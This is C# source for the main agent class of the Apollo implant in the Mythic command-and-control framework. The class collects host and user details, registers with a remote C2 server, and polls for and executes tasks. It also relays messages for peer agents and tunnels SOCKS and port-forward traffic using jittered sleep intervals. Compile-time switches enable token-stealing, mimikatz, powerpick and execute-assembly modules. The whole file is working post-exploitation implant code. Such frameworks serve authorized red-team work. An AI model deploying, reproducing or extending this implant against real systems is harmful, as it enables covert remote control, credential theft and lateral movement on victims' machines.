#define COMMAND_NAME_UPPER

#if DEBUG
#undef MAKE_TOKEN
#undef STEAL_TOKEN
#undef REV2SELF
#undef GETPRIVS
#undef WHOAMI
#undef POWERPICK
#undef MIMIKATZ
#undef EXECUTE_ASSEMBLY
#undef SOCKS
#define MAKE_TOKEN
#define STEAL_TOKEN
#define REV2SELF
#define GETPRIVS
#define WHOAMI
#define POWERPICK
#define MIMIKATZ
#define EXECUTE_ASSEMBLY
#define SOCKS
#endif


using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using Mythic.C2Profiles;
using Apollo.CommandModules;
using Apollo.Jobs;
using Microsoft.Win32;
using AS = Mythic.Structs;
using C2Relays;
using static Utils.DebugUtils;
using static Utils.StringUtils;
using Apollo.Tasks;
using Apollo.SocksProxy;
using Apollo.RPortFwdProxy;
using Mythic.Structs;
using Newtonsoft.Json;
using Apollo.MessageInbox;
using System.Windows.Forms;

namespace Apollo
{

    public struct DelegateNode
    {
        public string AgentUUID;
        public Relay NodeRelay;
        public bool OutboundConnect;
        public string OriginatingTaskID;
        public string AgentComputerName;
        public AS.C2ProfileInfo ProfileInfo;
        public bool TemporaryUUID;
    }


    /// <summary>
    /// This is the main working class that is responsible for
    /// connecting back to an Apfell server. This class will
    /// be responsbile for dispatching tasks and maintaining
    /// job states.
    /// </summary>
    public class Agent
    {
        private const int MAX_RETRIES = 20;
        public string action = "checkin";
        
        //internal List<Job> JobList;
        public string host;
        public string ip;
        public int pid;
        internal int SleepInterval;
        internal double Jitter = 0;
        public string user;
#if DEBUG
        public string uuid = Apollo.AgentUUID;
#else
        public string uuid = "UUID_HERE";
#endif
        public string domain;
        public string os;
        public string architecture;
        public int integrity_level { get; private set; }

        public bool IsActive { get; private set; } = false;
        
        private static Random random = new Random();

        // In the future, we need to change DelegateNodes to hold a list of delegate nodes,
        // which is then filtered down for unlinking and passing messages. Current model
        // will not support multiple P2P agents from one host to another.
        public Dictionary<string, DelegateNode> DelegateNodes = new Dictionary<string, DelegateNode>();
        public Mutex DelegateNodesMutex = new Mutex();

        public Mutex mtx = new Mutex();

        public C2Profile Profile;


        /// <summary>
        /// This is the main working class that is responsible for
        /// connecting back to an Apfell server. This class will
        /// be responsbile for dispatching tasks and maintaining
        /// job states.
        /// </summary>
        /// <param name="profileInstance">An instance of a C2Profile to establish communications with.</param>
        /// <param name="sleepTime">Sleep time to wait between checkins. Default 5 seconds.</param>
        public Agent(C2Profile profileInstance, int sleepTime=5000)
        {
#if MAKE_TOKEN || STEAL_TOKEN || REV2SELF || GETPRIVS || WHOAMI || POWERPICK || MIMIKATZ || EXECUTE_ASSEMBLY
            Credentials.CredentialManager.Initialize();
            integrity_level = Credentials.CredentialManager.IntegrityLevel;
#endif
            Profile = profileInstance;
            ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            host = Dns.GetHostName();
            domain = Environment.UserDomainName;
            pid = System.Diagnostics.Process.GetCurrentProcess().Id;
            os = String.Format("{0} ({1})", GetOSVersion(), Environment.OSVersion.Version.ToString());

            if (IntPtr.Size == 8)
                architecture = "x64";
            else
                architecture = "x86";
            SleepInterval = profileInstance.CallbackInterval;
            user = Environment.UserName;
            //Endpoint = serverEndpoint;
            JobManager.Intitialize(this);
        }

        public void AddDelegateNode(string uuid, DelegateNode dg)
        {
            if (DelegateNodes.ContainsKey(uuid))
                RemoveDelegateNode(uuid);
            DelegateNodesMutex.WaitOne();
            try
            {
                DelegateNodes.Add(uuid, dg);
            }
            catch
            {
            }
            finally
            {
                DelegateNodesMutex.ReleaseMutex();
            }
        }

        public void RemoveDelegateNode(string uuid)
        {
            if (DelegateNodes.ContainsKey(uuid))
            {
                DelegateNode node = DelegateNodes[uuid];
                if (node.NodeRelay.IsActive() && !node.TemporaryUUID)
                {
                    node.NodeRelay.StopAllThreads = true;
                    while (node.NodeRelay.IsActive())
                    {
                        Thread.Sleep(500);
                    }
                }
                DelegateNodesMutex.WaitOne();
                DelegateNodes.Remove(uuid);
                DelegateNodesMutex.ReleaseMutex();
                AS.EdgeNode en = new AS.EdgeNode()
                {
                    source = this.uuid,
                    destination = node.AgentUUID,
                    direction = 1, // from source to dest
                    metadata = "",
                    action = "remove",
                    c2_profile = node.ProfileInfo.name
                };
                if (!node.TemporaryUUID)
                {
                    var response = new ApolloTaskResponse()
                    {
                        task_id = node.OriginatingTaskID,
                        completed = true,
                        user_output = $"Lost link to {node.AgentComputerName} (Agent UUID: {node.AgentUUID})",
                        status = "error",
                        edges = new AS.EdgeNode[] { en }
                    };
                    
                    try
                    {
                        Profile.SendResponse(node.OriginatingTaskID, response);
                    }
                    catch (Exception ex)
                    {
                        DebugWriteLine($"Error sending node removal message to server. Reason: {ex.Message}\n\tStackTrack: {ex.StackTrace}");
                    }
                }
            }
        }

        private static string GetOSVersion()
        {
            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
        }

        /// <summary>
        /// Function responsible for kicking off the
        /// registration sequence for the agent to connect
        /// back to the primary Apfell Server specified by
        /// the given C2 Profile.
        /// </summary>
        /// <returns>TRUE if the agent was sucessfully registered with the server, FALSE otherwise.</returns>
        public bool InitializeAgent()
        {
            int retryCount = 0;
            // If we didn't get success, retry and increment counter
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    //DebugWriteLine($"Attempting to initialize agent. Attempt {retryCount}");
                    string newUUID = Profile.RegisterAgent(this);
                    uuid = newUUID;
                    retryCount = 0;
                    IsActive = true;
                    return true;
                } 
                catch (Exception ex)
                {
                    DebugWriteLine($"Failed to register agent: {ex.Message}. Retrying.");
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return false;
        }


        internal void MonitorRelays()
        {
            while (IsActive)
            {
                var copy = new Dictionary<string, DelegateNode>(DelegateNodes);
                foreach(KeyValuePair<string, DelegateNode> entry in copy)
                {
                    if (!entry.Value.NodeRelay.IsActive() && !entry.Value.TemporaryUUID)
                    {
                        RemoveDelegateNode(entry.Key);
                    }
                }
                Thread.Sleep(5000);
            }
        }

        public void MonitorIsActive()
        {
            while (true)
            {
                IsActive = (bool)MessageInbox.Inbox.GetMessage("is_active");
            }
        }

        public void DispatchTasks(Task[] tasks)
        {
            foreach (var task in tasks)
            {
                JobManager.AddJob(task);
            }
        }

        public void DispatchDelegates(Dictionary<string, string>[] delegates)
        {
            foreach (var msg in delegates)
            {
                //DispatchDelegate(msg);
                new Thread(() => DispatchDelegate(new DelegateMessage() { 
                    UUID = msg.Keys.First(),
                    Message = msg[msg.Keys.First()]
                })).Start();
            }
        }

        public void DispatchDelegates(DelegateMessage[] delegates)
        {
            foreach (Mythic.Structs.DelegateMessage msg in delegates)
            {
                //DispatchDelegate(msg);
                new Thread(() => DispatchDelegate(msg)).Start();
            }
        }

        public void DispatchSocksDatagrams(SocksDatagram[] dgs)
        {
            //DebugWriteLine($"Processing {dgs.Length} SocksDatagrams...");
            for(int i=0; i < dgs.Length; i++)
            {
                //DebugWriteLine($"Datagram #{i + 1} is of length: {System.Convert.FromBase64String(dgs[i].data).Length}");
                SocksController.AddDatagramToQueue(dgs[i]);
            }
            //DebugWriteLine($"Finished processing {dgs.Length} SocksDatagrams!");
        }

        public void DispatchPortFwdDatagrams(PortFwdDatagram[] dgs)
        {
            //DebugWriteLine($"Datagram #{i + 1} is of length: {System.Convert.FromBase64String(dgs[i].data).Length}");
            for (int i = 0; i < dgs.Length; i++)
            {
                //DebugWriteLine($"Datagram #{i + 1} is of length: {System.Convert.FromBase64String(dgs[i].data).Length}");
                RPortFwdController.AddDatagramToQueue(dgs[i]);
            }
            //DebugWriteLine($"Finished processing {dgs.Length} SocksDatagrams!");
        }

        public void DispatchTaskQueue(Mythic.Structs.TaskQueue tasks)
        {

            if (tasks.SocksDatagrams != null && tasks.SocksDatagrams.Length > 0)
            {
                DispatchSocksDatagrams(tasks.SocksDatagrams);
            }

            if (tasks.PortFwdDg != null && tasks.PortFwdDg.Length > 0)
            {
                DispatchPortFwdDatagrams(tasks.PortFwdDg);
            }

            if (tasks.Tasks.Length != 0)
            {
                DebugWriteLine($"Received {tasks.Tasks.Length} new tasks to execute.");
                DispatchTasks(tasks.Tasks);
            }


            if (tasks.Delegates.Length != 0)
            {
                DebugWriteLine($"Received {tasks.Delegates.Length} new delegate messages to pass.");
                DispatchDelegates(tasks.Delegates);
            }
        }


        /// <summary>
        /// Main initializaiton task loop that will begin
        /// the task loop of the function should the agent
        /// successfully register to the Apfell server specified
        /// by the C2 Profile. On each checkin, should a job be
        /// issued, it will be added to its own job queue and begin
        /// start the task in a separate thread.
        /// </summary>
        public void Start()
        {
            Thread activeMonitorThread = new Thread(MonitorIsActive);
            activeMonitorThread.Start();
            while (true)
            {
                if (InitializeAgent())
                {
                    Thread relayThread = new Thread(MonitorRelays);
                    relayThread.Start();
                    while (IsActive)
                    {
                        DebugWriteLine("------ NEW LOOP ------");
                        Stopwatch sw = new Stopwatch();
                        sw.Start();
                        // Need to parse delegates and tasks from checktasking (which should be renamed)
                        new Thread(()=>SendTaskOutput()).Start();
                        Mythic.Structs.TaskQueue tasks = CheckTasking();

                        Stopwatch sw2 = new Stopwatch();
                        sw2.Start();
                        new Thread(() => DispatchTaskQueue(tasks)).Start();
                        sw2.Stop();
                        DebugWriteLine($"Took {FormatTimespan(sw2.Elapsed)} to start DispatchTaskQueue thread.");
                        //DebugWriteLine("~~~~~~~~~~~~~~~ Started main task dispatch!");
                        Thread.Sleep(GetSleepTime());
                        sw.Stop();
                        TimeSpan ts = sw.Elapsed;
                        string elapsedTime = String.Format("{0:00}.{1:00}s", ts.Seconds, ts.Milliseconds / 10);
                        DebugWriteLine($"Main loop took {elapsedTime} to complete.");
                    }
                }
            }
        }

        private void SendTaskOutput()
        {
            int retryCount = 0;
            Tasks.ApolloTaskResponse[] responses = JobManager.GetJobOutput();
            PortFwdDatagram[] rdatagrams = RPortFwdController.GetMythicMessagesFromQueue();
            SocksDatagram[] datagrams = SocksController.GetMythicMessagesFromQueue();
            List<ApolloTaskResponse> lResponses = new List<ApolloTaskResponse>(); // probably should be used to resend
            if (responses.Length > 0 || datagrams.Length > 0)
            {
                string guid = Guid.NewGuid().ToString();
                while (retryCount < MAX_RETRIES)
                {
                    string result = Profile.SendResponses(guid, responses, datagrams,rdatagrams);
                    if (string.IsNullOrEmpty(result))
                    {
                        break;
                    }
                    MythicServerResponse serverReply = JsonConvert.DeserializeObject<MythicServerResponse>(result);
                    foreach (MythicTaskResponse rep in serverReply.responses)
                    {
                        if (rep.status == "error")
                        {
                            lResponses.Add(responses.Single(c => c.task_id == rep.task_id));
                        } else
                        {
                            Inbox.AddMessage(rep.task_id, rep);
                        }
                    }
                    if (serverReply.delegates != null && serverReply.delegates.Length > 0)
                        DispatchDelegates(serverReply.delegates);
                    responses = lResponses.ToArray();
                    lResponses.Clear();
                    retryCount += 1;
                    if (responses.Length == 0)
                        break;
                }
            }
        }


        public void DispatchDelegate(Mythic.Structs.DelegateMessage delegateMessage)
        {
            //DebugWriteLine($"Attempting to dispatch delegate message to agent UUID: {delegateMessage.UUID}");
            if (DelegateNodes.ContainsKey(delegateMessage.UUID))
            {
                //DebugWriteLine($"Adding message to TaskQueue for agent UUID: {delegateMessage.UUID}");
                DelegateNodes[delegateMessage.UUID].NodeRelay.AddMessageToTaskQueue(delegateMessage.Message);
            } else
            {
                //DebugWriteLine($"ERROR! Could not dispatch delegate message to Agent UUID: {delegateMessage.UUID}");
            }
        }

        /// <summary>
        /// Try and send a response to the Apfell server based
        /// on the MAX_RETRY count. 
        /// </summary>
        /// <param name="job">Job to send response data about.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public bool TryPostResponse(Job job)
        //{
        //    int retryCount = 0;
        //    string result;
        //    object msg;
        //    if (job.Task.message.GetType() == typeof(ApolloTaskResponse))
        //        msg = (ApolloTaskResponse)job.Task.message;
        //    else
        //        msg = new ApolloTaskResponse(job.Task.id, (job.Task.status == "complete"), job.Task.message);
        //    result = Profile.SendResponse(job.Task.id, msg);
        //    while ((!result.Contains("success") || result == "") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendResponse(job.Task.id, new ApolloTaskResponse(job.Task.id, (job.Task.status == "success"), job.Task.message));
        //        retryCount++;
        //    }
        //    return result.Contains("success");
        //}

        /// <summary>
        /// Try and send a response to the Apfell server based
        /// on the MAX_RETRY count. 
        /// </summary>
        /// <param name="job">Job to send response data about.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public string TryPostResponse(string task_id, object dataToSend)
        //{
        //    int retryCount = 0;
        //    string result = "";

        //    try
        //    {
        //        while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //        {
        //            result = Profile.SendResponse(task_id, dataToSend);
        //            retryCount++;
        //        }
        //    } catch { }
        //    return result;
        //}

        /// <summary>
        /// Try and send a response to the Apfell server based
        /// on the MAX_RETRY count. 
        /// </summary>
        /// <param name="job">Job to send response data about.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public bool TrySendChunk(string task_id, Mythic.Structs.FileChunk dataToSend)
        //{
        //    int retryCount = 0;
        //    string result = "";

        //    try
        //    {
        //        while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //        {
        //            result = Profile.SendResponse(task_id, dataToSend);
        //            retryCount++;
        //        }
        //    }
        //    catch { }
        //    return result.Contains("success");
        //}



        /// <summary>
        /// Attempt to post a response to the Apfell server
        /// given a SCTaskResponse item. This function is
        /// primarily used when attempting to stream output
        /// to the Apfell server, such as is the case in
        /// keylogging or large file downloads.
        /// </summary>
        /// <param name="response">SCTaskResp instance</param>
        /// <returns>String version of the Apfell server response.</returns>
        //public string TryGetPostResponse(string task_id, ApolloTaskResponse response)
        //{
        //    int retryCount = 0;
        //    string result = "";
        //    result = Profile.SendResponse(task_id, response);
        //    while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendResponse(task_id, response);
        //        retryCount++;
        //    }
        //    return result;
        //}

        /// <summary>
        /// Attempt to post the response to the Apfell server. 
        /// Primarily this function is used by tasks who require
        /// streaming output to the server.
        /// </summary>
        /// <param name="response">SCTaskResp instance to send up to the mothership.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public bool TryPostResponse(string task_id, ApolloTaskResponse response)
        //{
        //    int retryCount = 0;
        //    string result;
        //    result = Profile.SendResponse(task_id, response);
        //    //while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    //{
        //    //    result = Profile.SendResponse(task_id, response);
        //    //    retryCount++;
        //    //}
        //    return result.Contains("success");
        //}

        //public bool TryPostResponses(string task_id, object[] responses)
        //{
        //    int retryCount = 0;
        //    string result;
        //    result = Profile.SendResponses(task_id, responses);
        //    while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendResponses(task_id, responses);
        //        retryCount++;
        //    }
        //    return result.Contains("success");
        //}

        ///// <summary>
        ///// Attempt to send a complete message based on the
        ///// job associated with it.
        ///// </summary>
        ///// <param name="job">Job of the executing task.</param>
        ///// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public bool TrySendComplete(Job job)
        //{
        //    int retryCount = 0;
        //    string result = Profile.SendComplete(job.Task.id);
        //    while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendComplete(job.Task.id);
        //        retryCount++;
        //    }
        //    return result.Contains("success");
        //}

        ///// <summary>
        ///// Attempt to send a complete message based on the
        ///// task id associated with it.
        ///// </summary>
        ///// <param name="taskID">SCTask.TaskID of the task.</param>
        ///// <returns>TRUE if successful, FALSE otherwise.</returns>
        //public bool TrySendComplete(string taskID)
        //{
        //    int retryCount = 0;
        //    string result = Profile.SendComplete(taskID);
        //    while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendComplete(taskID);
        //        retryCount++;
        //    }
        //    return result.Contains("success");
        //}

        ///// <summary>
        ///// Send an error to the Apfell controller
        ///// given a Job that has failed its one and
        ///// only purpose.
        ///// </summary>
        ///// <param name="job">A Job class who has disappointed its parents.</param>
        ///// <returns>TRUE if contact with Apfell was successful, FALSE otherwise.</returns>
        //public bool TrySendError(Job job)
        //{
        //    int retryCount = 0;
        //    string result;
        //    result = Profile.SendError(job.Task.id, job.Task.message);
        //    while (!result.Contains("success") && retryCount < MAX_RETRIES)
        //    {
        //        result = Profile.SendComplete(job.Task.id);
        //        retryCount++;
        //    }
        //    return result.Contains("success");
        //}
        
        ///// <summary>
        ///// Send the message of the job over to the
        ///// Apfell server and see how it goes. Maybe
        ///// it works out, but maybe it doesn't. Who
        ///// knows? That's life. That's why the return
        ///// value is void.
        ///// </summary>
        ///// <param name="job">Job whose task completion status will be relayed.</param>
        //public void SendResult(Job job)
        //{
        //    int retryCount = 0;
        //    string result;
        //    if (job.Task.status == "complete") // &&
        //        //job.Task.command != "download" &&
        //        //job.Task.command != "screencapture")
        //    {
        //        TryPostResponse(job);
        //        //if (TryPostResponse(job))
        //        //{
        //        //    TrySendComplete(job);
        //        //}
        //    }
        //    else if (job.Task.status == "error")
        //    {
        //        //if (TrySendError(job))
        //        //{
        //        //    TrySendComplete(job);
        //        //}
        //        TrySendError(job);
        //    }

        //    Jobs.JobManager.RemoveJob(job);
        //}

        /// <summary>
        /// Check the Apfell server to see if there's any
        /// taskings associated with our agent.
        /// </summary>
        /// <returns>
        /// SCTask instance with the action to perform, 
        /// if successful. The function returns null if the 
        /// application times out.
        /// </returns>
        public Mythic.Structs.TaskQueue CheckTasking()
        {
            int retryCount = 0;
            Mythic.Structs.TaskQueue tasks = new Mythic.Structs.TaskQueue();
            // DelegateMessages[] delegateMessages = null;
            Stopwatch sw = new Stopwatch();
            sw.Start();
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    // Check Tasking should be renamed
                    // return tuple of tasks and delegates
                    // tasks = results[0]
                    // delegates = results[1]
                    // return (tasks, delegates)
                    //DebugWriteLine("~~~~~~~~~~~~~~~ Attempting to fetch new tasks...");
                    tasks = Profile.GetMessages(this);
                    //DebugWriteLine("~~~~~~~~~~~~~~~ Successfully fetched new tasks!");
                    break;
                } 
                catch (Exception ex)
                {
                    //DebugWriteLine($"~~~~~~~~~~~~~~~ Failed to fetch new tasks. Reason: {ex.Message}. Sleeping {SleepInterval} seconds.");
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            sw.Stop();
            TimeSpan ts = sw.Elapsed;
            string elapsed = string.Format("{0:00}.{1:00}s", ts.Seconds, ts.Milliseconds / 10);
            DebugWriteLine($"Check tasking took {elapsed} to run.");
            return tasks;
        }

        public int GetSleepTime()
        {
            if (Jitter == 0 || SleepInterval == 0)
                return SleepInterval;
            int minSleep = (int)(SleepInterval * Jitter);
            int maxSleep = (int)(SleepInterval * (Jitter+1));
            return (int)(random.NextDouble() * (maxSleep - minSleep) + minSleep);
            
        }
    }
}
